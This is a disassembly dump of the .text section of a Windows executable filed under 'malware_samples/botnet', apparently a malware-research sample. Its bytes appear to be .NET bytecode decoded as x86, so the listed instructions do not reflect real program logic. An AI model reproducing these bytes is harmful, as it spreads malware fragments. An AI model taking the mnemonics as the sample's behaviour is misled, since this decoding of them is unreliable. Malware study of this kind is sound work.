
malware_samples/botnet/f0dd907348f30d6b192af01ed332b17b28c6ad6400ae7f22cd44bc9068bf4de0.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	f0 c6 00 00          	lock movb $0x0,(%eax)
  402004:	00 00                	add    %al,(%eax)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 f4 59 00    	add    %al,0x59f400
  402013:	00 c8                	add    %cl,%al
  402015:	6c                   	insb   (%dx),%es:(%edi)
  402016:	00 00                	add    %al,(%eax)
  402018:	03 00                	add    (%eax),%eax
  40201a:	00 00                	add    %al,(%eax)
  40201c:	01 00                	add    %eax,(%eax)
  40201e:	00 06                	add    %al,(%esi)
	...
  402050:	bf eb 1e 56 fb       	mov    $0xfb561eeb,%edi
  402055:	cd 97                	int    $0x97
  402057:	3b b2 19 02 24 30    	cmp    0x30240219(%edx),%esi
  40205d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40205e:	78 43                	js     0x4020a3
  402060:	00 3d 56 44 d2 1e    	add    %bh,0x1ed24456
  402066:	62 b9 d4 f1 80 e7    	bound  %edi,-0x187f0e2c(%ecx)
  40206c:	e6 c3                	out    %al,$0xc3
  40206e:	39 41 2e             	cmp    %eax,0x2e(%ecx)
  402071:	00 2f                	add    %ch,(%edi)
  402073:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  402077:	00 1e                	add    %bl,(%esi)
  402079:	02 28                	add    (%eax),%ch
  40207b:	18 00                	sbb    %al,(%eax)
  40207d:	00 0a                	add    %cl,(%edx)
  40207f:	2a 1a                	sub    (%edx),%bl
  402081:	7e 13                	jle    0x402096
  402083:	00 00                	add    %al,(%eax)
  402085:	04 2a                	add    $0x2a,%al
  402087:	1e                   	push   %ds
  402088:	02 80 13 00 00 04    	add    0x4000013(%eax),%al
  40208e:	2a 1a                	sub    (%edx),%bl
  402090:	7e 14                	jle    0x4020a6
  402092:	00 00                	add    %al,(%eax)
  402094:	04 2a                	add    $0x2a,%al
  402096:	1e                   	push   %ds
  402097:	02 80 14 00 00 04    	add    0x4000014(%eax),%al
  40209d:	2a 1a                	sub    (%edx),%bl
  40209f:	7e 15                	jle    0x4020b6
  4020a1:	00 00                	add    %al,(%eax)
  4020a3:	04 2a                	add    $0x2a,%al
  4020a5:	1e                   	push   %ds
  4020a6:	02 80 15 00 00 04    	add    0x4000015(%eax),%al
  4020ac:	2a 1a                	sub    (%edx),%bl
  4020ae:	7e 16                	jle    0x4020c6
  4020b0:	00 00                	add    %al,(%eax)
  4020b2:	04 2a                	add    $0x2a,%al
  4020b4:	1e                   	push   %ds
  4020b5:	02 80 16 00 00 04    	add    0x4000016(%eax),%al
  4020bb:	2a 1a                	sub    (%edx),%bl
  4020bd:	7e 17                	jle    0x4020d6
  4020bf:	00 00                	add    %al,(%eax)
  4020c1:	04 2a                	add    $0x2a,%al
  4020c3:	1e                   	push   %ds
  4020c4:	02 80 17 00 00 04    	add    0x4000017(%eax),%al
  4020ca:	2a 1a                	sub    (%edx),%bl
  4020cc:	7e 18                	jle    0x4020e6
  4020ce:	00 00                	add    %al,(%eax)
  4020d0:	04 2a                	add    $0x2a,%al
  4020d2:	1e                   	push   %ds
  4020d3:	02 80 18 00 00 04    	add    0x4000018(%eax),%al
  4020d9:	2a 1a                	sub    (%edx),%bl
  4020db:	7e 19                	jle    0x4020f6
  4020dd:	00 00                	add    %al,(%eax)
  4020df:	04 2a                	add    $0x2a,%al
  4020e1:	1e                   	push   %ds
  4020e2:	02 80 19 00 00 04    	add    0x4000019(%eax),%al
  4020e8:	2a 1a                	sub    (%edx),%bl
  4020ea:	7e 1a                	jle    0x402106
  4020ec:	00 00                	add    %al,(%eax)
  4020ee:	04 2a                	add    $0x2a,%al
  4020f0:	1a 7e 1b             	sbb    0x1b(%esi),%bh
  4020f3:	00 00                	add    %al,(%eax)
  4020f5:	04 2a                	add    $0x2a,%al
  4020f7:	1e                   	push   %ds
  4020f8:	02 80 1b 00 00 04    	add    0x400001b(%eax),%al
  4020fe:	2a 1a                	sub    (%edx),%bl
  402100:	7e 1c                	jle    0x40211e
  402102:	00 00                	add    %al,(%eax)
  402104:	04 2a                	add    $0x2a,%al
  402106:	1e                   	push   %ds
  402107:	02 80 1c 00 00 04    	add    0x400001c(%eax),%al
  40210d:	2a 1a                	sub    (%edx),%bl
  40210f:	7e 1d                	jle    0x40212e
  402111:	00 00                	add    %al,(%eax)
  402113:	04 2a                	add    $0x2a,%al
  402115:	1e                   	push   %ds
  402116:	02 80 1d 00 00 04    	add    0x400001d(%eax),%al
  40211c:	2a 2a                	sub    (%edx),%ch
  40211e:	02 28                	add    (%eax),%ch
  402120:	3e 00 00             	add    %al,%ds:(%eax)
  402123:	0a 16                	or     (%esi),%dl
  402125:	fe 03                	incb   (%ebx)
  402127:	2a 32                	sub    (%edx),%dh
  402129:	7e 0b                	jle    0x402136
  40212b:	00 00                	add    %al,(%eax)
  40212d:	04 03                	add    $0x3,%al
  40212f:	6f                   	outsl  %ds:(%esi),(%dx)
  402130:	3f                   	aas
  402131:	00 00                	add    %al,(%eax)
  402133:	0a 2a                	or     (%edx),%ch
  402135:	2e 73 18             	jae,pn 0x402150
  402138:	00 00                	add    %al,(%eax)
  40213a:	0a 80 1a 00 00 04    	or     0x400001a(%eax),%al
  402140:	2a e6                	sub    %dh,%ah
  402142:	28 29                	sub    %ch,(%ecx)
  402144:	00 00                	add    %al,(%eax)
  402146:	06                   	push   %es
  402147:	3a 28                	cmp    (%eax),%ch
  402149:	00 00                	add    %al,(%eax)
  40214b:	00 28                	add    %ch,(%eax)
  40214d:	2a 00                	sub    (%eax),%al
  40214f:	00 06                	add    %al,(%esi)
  402151:	3a 1e                	cmp    (%esi),%bl
  402153:	00 00                	add    %al,(%eax)
  402155:	00 28                	add    %ch,(%eax)
  402157:	2b 00                	sub    (%eax),%eax
  402159:	00 06                	add    %al,(%esi)
  40215b:	3a 14 00             	cmp    (%eax,%eax,1),%dl
  40215e:	00 00                	add    %al,(%eax)
  402160:	28 27                	sub    %ah,(%edi)
  402162:	00 00                	add    %al,(%eax)
  402164:	06                   	push   %es
  402165:	3a 0a                	cmp    (%edx),%cl
  402167:	00 00                	add    %al,(%eax)
  402169:	00 28                	add    %ch,(%eax)
  40216b:	28 00                	sub    %al,(%eax)
  40216d:	00 06                	add    %al,(%esi)
  40216f:	39 06                	cmp    %eax,(%esi)
  402171:	00 00                	add    %al,(%eax)
  402173:	00 14 28             	add    %dl,(%eax,%ebp,1)
  402176:	76 00                	jbe    0x402178
  402178:	00 0a                	add    %cl,(%edx)
  40217a:	2a 56 28             	sub    0x28(%esi),%dl
  40217d:	9c                   	pushf
  40217e:	00 00                	add    %al,(%eax)
  402180:	0a 73 9d             	or     -0x63(%ebx),%dh
  402183:	00 00                	add    %al,(%eax)
  402185:	0a 20                	or     (%eax),%ah
  402187:	20 02                	and    %al,(%edx)
  402189:	00 00                	add    %al,(%eax)
  40218b:	6f                   	outsl  %ds:(%esi),(%dx)
  40218c:	9e                   	sahf
  40218d:	00 00                	add    %al,(%eax)
  40218f:	0a 2a                	or     (%edx),%ch
  402191:	6e                   	outsb  %ds:(%esi),(%dx)
  402192:	7e 1e                	jle    0x4021b2
  402194:	00 00                	add    %al,(%eax)
  402196:	04 39                	add    $0x39,%al
  402198:	10 00                	adc    %al,(%eax)
  40219a:	00 00                	add    %al,(%eax)
  40219c:	7e 1e                	jle    0x4021bc
  40219e:	00 00                	add    %al,(%eax)
  4021a0:	04 6f                	add    $0x6f,%al
  4021a2:	ad                   	lods   %ds:(%esi),%eax
  4021a3:	00 00                	add    %al,(%eax)
  4021a5:	0a 14 80             	or     (%eax,%eax,4),%dl
  4021a8:	1e                   	push   %ds
  4021a9:	00 00                	add    %al,(%eax)
  4021ab:	04 2a                	add    $0x2a,%al
  4021ad:	7e 7e                	jle    0x40222d
  4021af:	0f 00 00             	sldt   (%eax)
  4021b2:	04 28                	add    $0x28,%al
  4021b4:	17                   	pop    %ss
  4021b5:	00 00                	add    %al,(%eax)
  4021b7:	0a 39                	or     (%ecx),%bh
  4021b9:	0f 00 00             	sldt   (%eax)
  4021bc:	00 28                	add    %ch,(%eax)
  4021be:	30 00                	xor    %al,(%eax)
  4021c0:	00 06                	add    %al,(%esi)
  4021c2:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  4021c8:	40                   	inc    %eax
  4021c9:	00 00                	add    %al,(%eax)
  4021cb:	06                   	push   %es
  4021cc:	2a 56 72             	sub    0x72(%esi),%dl
  4021cf:	6a 25                	push   $0x25
  4021d1:	00 70 7e             	add    %dh,0x7e(%eax)
  4021d4:	10 00                	adc    %al,(%eax)
  4021d6:	00 04 28             	add    %al,(%eax,%ebp,1)
  4021d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4021da:	00 00                	add    %al,(%eax)
  4021dc:	0a 80 23 00 00 04    	or     0x4000023(%eax),%al
  4021e2:	2a be 73 94 00 00    	sub    0x9473(%esi),%bh
  4021e8:	06                   	push   %es
  4021e9:	25 72 1e 21 00       	and    $0x211e72,%eax
  4021ee:	70 6f                	jo     0x40225f
  4021f0:	7f 00                	jg     0x4021f2
  4021f2:	00 06                	add    %al,(%esi)
  4021f4:	72 16                	jb     0x40220c
  4021f6:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  4021fa:	8c 00                	mov    %es,(%eax)
  4021fc:	00 06                	add    %al,(%esi)
  4021fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4021ff:	89 00                	mov    %eax,(%eax)
  402201:	00 06                	add    %al,(%esi)
  402203:	28 20                	sub    %ah,(%eax)
  402205:	00 00                	add    %al,(%eax)
  402207:	06                   	push   %es
  402208:	20 e8                	and    %ch,%al
  40220a:	03 00                	add    (%eax),%eax
  40220c:	00 28                	add    %ch,(%eax)
  40220e:	14 00                	adc    $0x0,%al
  402210:	00 0a                	add    %cl,(%edx)
  402212:	2a da                	sub    %dl,%bl
  402214:	73 94                	jae    0x4021aa
  402216:	00 00                	add    %al,(%eax)
  402218:	06                   	push   %es
  402219:	25 72 1e 21 00       	and    $0x211e72,%eax
  40221e:	70 6f                	jo     0x40228f
  402220:	7f 00                	jg     0x402222
  402222:	00 06                	add    %al,(%esi)
  402224:	72 28                	jb     0x40224e
  402226:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  40222a:	8c 00                	mov    %es,(%eax)
  40222c:	00 06                	add    %al,(%esi)
  40222e:	25 72 28 26 00       	and    $0x262872,%eax
  402233:	70 6f                	jo     0x4022a4
  402235:	7f 00                	jg     0x402237
  402237:	00 06                	add    %al,(%esi)
  402239:	02 6f 8c             	add    -0x74(%edi),%ch
  40223c:	00 00                	add    %al,(%eax)
  40223e:	06                   	push   %es
  40223f:	6f                   	outsl  %ds:(%esi),(%dx)
  402240:	89 00                	mov    %eax,(%eax)
  402242:	00 06                	add    %al,(%esi)
  402244:	28 20                	sub    %ah,(%eax)
  402246:	00 00                	add    %al,(%eax)
  402248:	06                   	push   %es
  402249:	2a 2e                	sub    (%esi),%ch
  40224b:	73 c9                	jae    0x402216
  40224d:	00 00                	add    %al,(%eax)
  40224f:	0a 80 24 00 00 04    	or     0x4000024(%eax),%al
  402255:	2a 5e 02             	sub    0x2(%esi),%bl
  402258:	28 19                	sub    %bl,(%ecx)
  40225a:	00 00                	add    %al,(%eax)
  40225c:	0a 03                	or     (%ebx),%al
  40225e:	6f                   	outsl  %ds:(%esi),(%dx)
  40225f:	1f                   	pop    %ds
  402260:	00 00                	add    %al,(%eax)
  402262:	0a 28                	or     (%eax),%ch
  402264:	4d                   	dec    %ebp
  402265:	00 00                	add    %al,(%eax)
  402267:	06                   	push   %es
  402268:	28 ce                	sub    %cl,%dh
  40226a:	00 00                	add    %al,(%eax)
  40226c:	0a 2a                	or     (%edx),%ch
  40226e:	5e                   	pop    %esi
  40226f:	28 19                	sub    %bl,(%ecx)
  402271:	00 00                	add    %al,(%eax)
  402273:	0a 02                	or     (%edx),%al
  402275:	03 28                	add    (%eax),%ebp
  402277:	1a 00                	sbb    (%eax),%al
  402279:	00 0a                	add    %cl,(%edx)
  40227b:	28 4f 00             	sub    %cl,0x0(%edi)
  40227e:	00 06                	add    %al,(%esi)
  402280:	6f                   	outsl  %ds:(%esi),(%dx)
  402281:	1b 00                	sbb    (%eax),%eax
  402283:	00 0a                	add    %cl,(%edx)
  402285:	2a 62 1f             	sub    0x1f(%edx),%ah
  402288:	20 8d 44 00 00 01    	and    %cl,0x1000044(%ebp)
  40228e:	25 d0 2d 00 00       	and    $0x2dd0,%eax
  402293:	04 28                	add    $0x28,%al
  402295:	e4 00                	in     $0x0,%al
  402297:	00 0a                	add    %cl,(%edx)
  402299:	80 2c 00 00          	subb   $0x0,(%eax,%eax,1)
  40229d:	04 2a                	add    $0x2a,%al
  40229f:	32 7e 2e             	xor    0x2e(%esi),%bh
  4022a2:	00 00                	add    %al,(%eax)
  4022a4:	04 02                	add    $0x2,%al
  4022a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4022a7:	1f                   	pop    %ds
  4022a8:	00 00                	add    %al,(%eax)
  4022aa:	0a 2a                	or     (%edx),%ch
  4022ac:	32 7e 2e             	xor    0x2e(%esi),%bh
  4022af:	00 00                	add    %al,(%eax)
  4022b1:	04 02                	add    $0x2,%al
  4022b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4022b4:	1b 00                	sbb    (%eax),%eax
  4022b6:	00 0a                	add    %cl,(%edx)
  4022b8:	2a 32                	sub    (%edx),%dh
  4022ba:	02 28                	add    (%eax),%ch
  4022bc:	e7 00                	out    %eax,$0x0
  4022be:	00 0a                	add    %cl,(%edx)
  4022c0:	28 58 00             	sub    %bl,0x0(%eax)
  4022c3:	00 06                	add    %al,(%esi)
  4022c5:	2a 8e 1a 8d 44 00    	sub    0x448d1a(%esi),%cl
  4022cb:	00 01                	add    %al,(%ecx)
  4022cd:	25 19 02 d2 9c       	and    $0x9cd20219,%eax
  4022d2:	25 18 02 1e 63       	and    $0x631e0218,%eax
  4022d7:	d2 9c 25 17 02 1f 10 	rcrb   %cl,0x101f0217(%ebp,%eiz,1)
  4022de:	63 d2                	arpl   %edx,%edx
  4022e0:	9c                   	pushf
  4022e1:	25 16 02 1f 18       	and    $0x181f0216,%eax
  4022e6:	63 d2                	arpl   %edx,%edx
  4022e8:	9c                   	pushf
  4022e9:	2a 4e 18             	sub    0x18(%esi),%cl
  4022ec:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4022f0:	01 25 17 02 d2 9c    	add    %esp,0x9cd20217
  4022f6:	25 16 02 1e 63       	and    $0x631e0216,%eax
  4022fb:	d2 9c 2a 32 02 28 e8 	rcrb   %cl,-0x17d7fdce(%edx,%ebp,1)
  402302:	00 00                	add    %al,(%eax)
  402304:	0a 28                	or     (%eax),%ch
  402306:	58                   	pop    %eax
  402307:	00 00                	add    %al,(%eax)
  402309:	06                   	push   %es
  40230a:	2a 2e                	sub    (%esi),%ch
  40230c:	73 e9                	jae    0x4022f7
  40230e:	00 00                	add    %al,(%eax)
  402310:	0a 80 2e 00 00 04    	or     0x400002e(%eax),%al
  402316:	2a 56 02             	sub    0x2(%esi),%dl
  402319:	15 7d 30 00 00       	adc    $0x307d,%eax
  40231e:	04 02                	add    $0x2,%al
  402320:	28 18                	sub    %bl,(%eax)
  402322:	00 00                	add    %al,(%eax)
  402324:	0a 02                	or     (%edx),%al
  402326:	03 7d 2f             	add    0x2f(%ebp),%edi
  402329:	00 00                	add    %al,(%eax)
  40232b:	04 2a                	add    $0x2a,%al
  40232d:	4a                   	dec    %edx
  40232e:	02 7b 2f             	add    0x2f(%ebx),%bh
  402331:	00 00                	add    %al,(%eax)
  402333:	04 02                	add    $0x2,%al
  402335:	7b 30                	jnp    0x402367
  402337:	00 00                	add    %al,(%eax)
  402339:	04 6f                	add    $0x6f,%al
  40233b:	ea 00 00 0a 2a 8a 02 	ljmp   $0x28a,$0x2a0a0000
  402342:	02 7b 30             	add    0x30(%ebx),%bh
  402345:	00 00                	add    %al,(%eax)
  402347:	04 17                	add    $0x17,%al
  402349:	58                   	pop    %eax
  40234a:	7d 30                	jge    0x40237c
  40234c:	00 00                	add    %al,(%eax)
  40234e:	04 02                	add    $0x2,%al
  402350:	7b 30                	jnp    0x402382
  402352:	00 00                	add    %al,(%eax)
  402354:	04 02                	add    $0x2,%al
  402356:	7b 2f                	jnp    0x402387
  402358:	00 00                	add    %al,(%eax)
  40235a:	04 6f                	add    $0x6f,%al
  40235c:	eb 00                	jmp    0x40235e
  40235e:	00 0a                	add    %cl,(%edx)
  402360:	fe 04 2a             	incb   (%edx,%ebp,1)
  402363:	22 02                	and    (%edx),%al
  402365:	15 7d 30 00 00       	adc    $0x307d,%eax
  40236a:	04 2a                	add    $0x2a,%al
  40236c:	56                   	push   %esi
  40236d:	02 28                	add    (%eax),%ch
  40236f:	18 00                	sbb    %al,(%eax)
  402371:	00 0a                	add    %cl,(%edx)
  402373:	02 03                	add    (%ebx),%al
  402375:	7d 32                	jge    0x4023a9
  402377:	00 00                	add    %al,(%eax)
  402379:	04 02                	add    $0x2,%al
  40237b:	04 7d                	add    $0x7d,%al
  40237d:	31 00                	xor    %eax,(%eax)
  40237f:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402382:	32 02                	xor    (%edx),%al
  402384:	7b 32                	jnp    0x4023b8
  402386:	00 00                	add    %al,(%eax)
  402388:	04 6f                	add    $0x6f,%al
  40238a:	71 00                	jno    0x40238c
  40238c:	00 06                	add    %al,(%esi)
  40238e:	2a 4e 02             	sub    0x2(%esi),%cl
  402391:	7b 32                	jnp    0x4023c5
  402393:	00 00                	add    %al,(%eax)
  402395:	04 6f                	add    $0x6f,%al
  402397:	71 00                	jno    0x402399
  402399:	00 06                	add    %al,(%esi)
  40239b:	25 03 6f 8c 00       	and    $0x8c6f03,%eax
  4023a0:	00 06                	add    %al,(%esi)
  4023a2:	2a 4e 02             	sub    0x2(%esi),%cl
  4023a5:	7b 32                	jnp    0x4023d9
  4023a7:	00 00                	add    %al,(%eax)
  4023a9:	04 6f                	add    $0x6f,%al
  4023ab:	71 00                	jno    0x4023ad
  4023ad:	00 06                	add    %al,(%esi)
  4023af:	25 03 6f 74 00       	and    $0x746f03,%eax
  4023b4:	00 06                	add    %al,(%esi)
  4023b6:	2a 4e 02             	sub    0x2(%esi),%cl
  4023b9:	7b 32                	jnp    0x4023ed
  4023bb:	00 00                	add    %al,(%eax)
  4023bd:	04 6f                	add    $0x6f,%al
  4023bf:	71 00                	jno    0x4023c1
  4023c1:	00 06                	add    %al,(%esi)
  4023c3:	25 03 6f 85 00       	and    $0x856f03,%eax
  4023c8:	00 06                	add    %al,(%esi)
  4023ca:	2a 36                	sub    (%esi),%dh
  4023cc:	02 7b 31             	add    0x31(%ebx),%bh
  4023cf:	00 00                	add    %al,(%eax)
  4023d1:	04 03                	add    $0x3,%al
  4023d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4023d4:	ea 00 00 0a 2a 32 02 	ljmp   $0x232,$0x2a0a0000
  4023db:	7b 31                	jnp    0x40240e
  4023dd:	00 00                	add    %al,(%eax)
  4023df:	04 6f                	add    $0x6f,%al
  4023e1:	eb 00                	jmp    0x4023e3
  4023e3:	00 0a                	add    %cl,(%edx)
  4023e5:	2a 66 02             	sub    0x2(%esi),%ah
  4023e8:	03 7d 33             	add    0x33(%ebp),%edi
  4023eb:	00 00                	add    %al,(%eax)
  4023ed:	04 02                	add    $0x2,%al
  4023ef:	02 7b 33             	add    0x33(%ebx),%bh
  4023f2:	00 00                	add    %al,(%eax)
  4023f4:	04 6f                	add    $0x6f,%al
  4023f6:	7d 00                	jge    0x4023f8
  4023f8:	00 0a                	add    %cl,(%edx)
  4023fa:	7d 34                	jge    0x402430
  4023fc:	00 00                	add    %al,(%eax)
  4023fe:	04 2a                	add    $0x2a,%al
  402400:	82 02 7b             	addb   $0x7b,(%edx)
  402403:	36 00 00             	add    %al,%ss:(%eax)
  402406:	04 18                	add    $0x18,%al
  402408:	3b 0d 00 00 00 02    	cmp    0x2000000,%ecx
  40240e:	28 6b 00             	sub    %ch,0x0(%ebx)
  402411:	00 06                	add    %al,(%esi)
  402413:	02 18                	add    (%eax),%bl
  402415:	7d 36                	jge    0x40244d
  402417:	00 00                	add    %al,(%eax)
  402419:	04 02                	add    $0x2,%al
  40241b:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  40241f:	06                   	push   %es
  402420:	2a 82 02 7b 36 00    	sub    0x367b02(%edx),%al
  402426:	00 04 19             	add    %al,(%ecx,%ebx,1)
  402429:	3b 0d 00 00 00 02    	cmp    0x2000000,%ecx
  40242f:	28 6b 00             	sub    %ch,0x0(%ebx)
  402432:	00 06                	add    %al,(%esi)
  402434:	02 19                	add    (%ecx),%bl
  402436:	7d 36                	jge    0x40246e
  402438:	00 00                	add    %al,(%eax)
  40243a:	04 02                	add    $0x2,%al
  40243c:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  402440:	06                   	push   %es
  402441:	2a 1e                	sub    (%esi),%bl
  402443:	02 28                	add    (%eax),%ch
  402445:	70 00                	jo     0x402447
  402447:	00 06                	add    %al,(%esi)
  402449:	2a 52 02             	sub    0x2(%edx),%dl
  40244c:	03 8c 68 00 00 01 7d 	add    0x7d010000(%eax,%ebp,2),%ecx
  402453:	35 00 00 04 02       	xor    $0x2040000,%eax
  402458:	1b 7d 36             	sbb    0x36(%ebp),%edi
  40245b:	00 00                	add    %al,(%eax)
  40245d:	04 2a                	add    $0x2a,%al
  40245f:	52                   	push   %edx
  402460:	02 03                	add    (%ebx),%al
  402462:	8c 95 00 00 01 7d    	mov    %ss,0x7d010000(%ebp)
  402468:	35 00 00 04 02       	xor    $0x2040000,%eax
  40246d:	1c 7d                	sbb    $0x7d,%al
  40246f:	36 00 00             	add    %al,%ss:(%eax)
  402472:	04 2a                	add    $0x2a,%al
  402474:	42                   	inc    %edx
  402475:	02 03                	add    (%ebx),%al
  402477:	7d 35                	jge    0x4024ae
  402479:	00 00                	add    %al,(%eax)
  40247b:	04 02                	add    $0x2,%al
  40247d:	1f                   	pop    %ds
  40247e:	0b 7d 36             	or     0x36(%ebp),%edi
  402481:	00 00                	add    %al,(%eax)
  402483:	04 2a                	add    $0x2a,%al
  402485:	52                   	push   %edx
  402486:	02 28                	add    (%eax),%ch
  402488:	70 00                	jo     0x40248a
  40248a:	00 06                	add    %al,(%esi)
  40248c:	25 03 7d 33 00       	and    $0x337d03,%eax
  402491:	00 04 04             	add    %al,(%esp,%eax,1)
  402494:	6f                   	outsl  %ds:(%esi),(%dx)
  402495:	81 00 00 06 2a 56    	addl   $0x562a0600,(%eax)
  40249b:	02 28                	add    (%eax),%ch
  40249d:	70 00                	jo     0x40249f
  40249f:	00 06                	add    %al,(%esi)
  4024a1:	25 03 7d 33 00       	and    $0x337d03,%eax
  4024a6:	00 04 04             	add    %al,(%esp,%eax,1)
  4024a9:	6a 6f                	push   $0x6f
  4024ab:	74 00                	je     0x4024ad
  4024ad:	00 06                	add    %al,(%esi)
  4024af:	2a 56 02             	sub    0x2(%esi),%dl
  4024b2:	28 6b 00             	sub    %ch,0x0(%ebx)
  4024b5:	00 06                	add    %al,(%esi)
  4024b7:	02 14 7d 35 00 00 04 	add    0x4000035(,%edi,2),%dl
  4024be:	02 17                	add    (%edi),%dl
  4024c0:	7d 36                	jge    0x4024f8
  4024c2:	00 00                	add    %al,(%eax)
  4024c4:	04 2a                	add    $0x2a,%al
  4024c6:	3e 02 03             	add    %ds:(%ebx),%al
  4024c9:	7d 35                	jge    0x402500
  4024cb:	00 00                	add    %al,(%eax)
  4024cd:	04 02                	add    $0x2,%al
  4024cf:	1a 7d 36             	sbb    0x36(%ebp),%bh
  4024d2:	00 00                	add    %al,(%eax)
  4024d4:	04 2a                	add    $0x2a,%al
  4024d6:	76 02                	jbe    0x4024da
  4024d8:	7b 35                	jnp    0x40250f
  4024da:	00 00                	add    %al,(%eax)
  4024dc:	04 3a                	add    $0x3a,%al
  4024de:	06                   	push   %es
  4024df:	00 00                	add    %al,(%eax)
  4024e1:	00 72 18             	add    %dh,0x18(%edx)
  4024e4:	21 00                	and    %eax,(%eax)
  4024e6:	70 2a                	jo     0x402512
  4024e8:	02 7b 35             	add    0x35(%ebx),%bh
  4024eb:	00 00                	add    %al,(%eax)
  4024ed:	04 6f                	add    $0x6f,%al
  4024ef:	38 00                	cmp    %al,(%eax)
  4024f1:	00 0a                	add    %cl,(%edx)
  4024f3:	2a 52 02             	sub    0x2(%edx),%dl
  4024f6:	1d 7d 36 00 00       	sbb    $0x367d,%eax
  4024fb:	04 02                	add    $0x2,%al
  4024fd:	03 8c 6c 00 00 01 7d 	add    0x7d010000(%esp,%ebp,2),%ecx
  402504:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  402509:	56                   	push   %esi
  40250a:	02 1f                	add    (%edi),%bl
  40250c:	09 7d 36             	or     %edi,0x36(%ebp)
  40250f:	00 00                	add    %al,(%eax)
  402511:	04 02                	add    $0x2,%al
  402513:	03 8c 97 00 00 01 7d 	add    0x7d010000(%edi,%edx,4),%ecx
  40251a:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  40251f:	52                   	push   %edx
  402520:	02 1e                	add    (%esi),%bl
  402522:	7d 36                	jge    0x40255a
  402524:	00 00                	add    %al,(%eax)
  402526:	04 02                	add    $0x2,%al
  402528:	03 8c 96 00 00 01 7d 	add    0x7d010000(%esi,%edx,4),%ecx
  40252f:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  402534:	1e                   	push   %ds
  402535:	02 28                	add    (%eax),%ch
  402537:	82 00 00             	addb   $0x0,(%eax)
  40253a:	06                   	push   %es
  40253b:	2a 22                	sub    (%edx),%ah
  40253d:	02 03                	add    (%ebx),%al
  40253f:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  402545:	1e                   	push   %ds
  402546:	02 28                	add    (%eax),%ch
  402548:	77 00                	ja     0x40254a
  40254a:	00 06                	add    %al,(%esi)
  40254c:	2a 22                	sub    (%edx),%ah
  40254e:	02 03                	add    (%ebx),%al
  402550:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  402554:	06                   	push   %es
  402555:	2a 1e                	sub    (%esi),%bl
  402557:	02 28                	add    (%eax),%ch
  402559:	78 00                	js     0x40255b
  40255b:	00 06                	add    %al,(%esi)
  40255d:	2a 22                	sub    (%edx),%ah
  40255f:	02 03                	add    (%ebx),%al
  402561:	28 85 00 00 06 2a    	sub    %al,0x2a060000(%ebp)
  402567:	1e                   	push   %ds
  402568:	02 7b 36             	add    0x36(%ebx),%bh
  40256b:	00 00                	add    %al,(%eax)
  40256d:	04 2a                	add    $0x2a,%al
  40256f:	32 02                	xor    (%edx),%al
  402571:	7b 38                	jnp    0x4025ab
  402573:	00 00                	add    %al,(%eax)
  402575:	04 73                	add    $0x73,%al
  402577:	5f                   	pop    %edi
  402578:	00 00                	add    %al,(%eax)
  40257a:	06                   	push   %es
  40257b:	2a 4a 02             	sub    0x2(%edx),%cl
  40257e:	73 c9                	jae    0x402549
  402580:	00 00                	add    %al,(%eax)
  402582:	0a 7d 38             	or     0x38(%ebp),%bh
  402585:	00 00                	add    %al,(%eax)
  402587:	04 02                	add    $0x2,%al
  402589:	28 18                	sub    %bl,(%eax)
  40258b:	00 00                	add    %al,(%eax)
  40258d:	0a 2a                	or     (%edx),%ch
  40258f:	3a 02                	cmp    (%edx),%al
  402591:	6f                   	outsl  %ds:(%esi),(%dx)
  402592:	00 01                	add    %al,(%ecx)
  402594:	00 0a                	add    %cl,(%edx)
  402596:	d2 02                	rolb   %cl,(%edx)
  402598:	28 97 00 00 06 2a    	sub    %dl,0x2a060000(%edi)
  40259e:	32 02                	xor    (%edx),%al
  4025a0:	20 c0                	and    %al,%al
  4025a2:	00 00                	add    %al,(%eax)
  4025a4:	00 6f ee             	add    %ch,-0x12(%edi)
  4025a7:	00 00                	add    %al,(%eax)
  4025a9:	0a 2a                	or     (%edx),%ch
  4025ab:	6a 02                	push   $0x2
  4025ad:	20 cb                	and    %cl,%bl
  4025af:	00 00                	add    %al,(%eax)
  4025b1:	00 6f ee             	add    %ch,-0x12(%edi)
  4025b4:	00 00                	add    %al,(%eax)
  4025b6:	0a 02                	or     (%edx),%al
  4025b8:	03 28                	add    (%eax),%ebp
  4025ba:	5c                   	pop    %esp
  4025bb:	00 00                	add    %al,(%eax)
  4025bd:	06                   	push   %es
  4025be:	16                   	push   %ss
  4025bf:	1e                   	push   %ds
  4025c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4025c1:	4c                   	dec    %esp
  4025c2:	00 00                	add    %al,(%eax)
  4025c4:	0a 2a                	or     (%edx),%ch
  4025c6:	7e 02                	jle    0x4025ca
  4025c8:	20 ca                	and    %cl,%dl
  4025ca:	00 00                	add    %al,(%eax)
  4025cc:	00 6f ee             	add    %ch,-0x12(%edi)
  4025cf:	00 00                	add    %al,(%eax)
  4025d1:	0a 02                	or     (%edx),%al
  4025d3:	03 28                	add    (%eax),%ebp
  4025d5:	fd                   	std
  4025d6:	00 00                	add    %al,(%eax)
  4025d8:	0a 28                	or     (%eax),%ch
  4025da:	58                   	pop    %eax
  4025db:	00 00                	add    %al,(%eax)
  4025dd:	06                   	push   %es
  4025de:	16                   	push   %ss
  4025df:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  4025e2:	00 00                	add    %al,(%eax)
  4025e4:	0a 2a                	or     (%edx),%ch
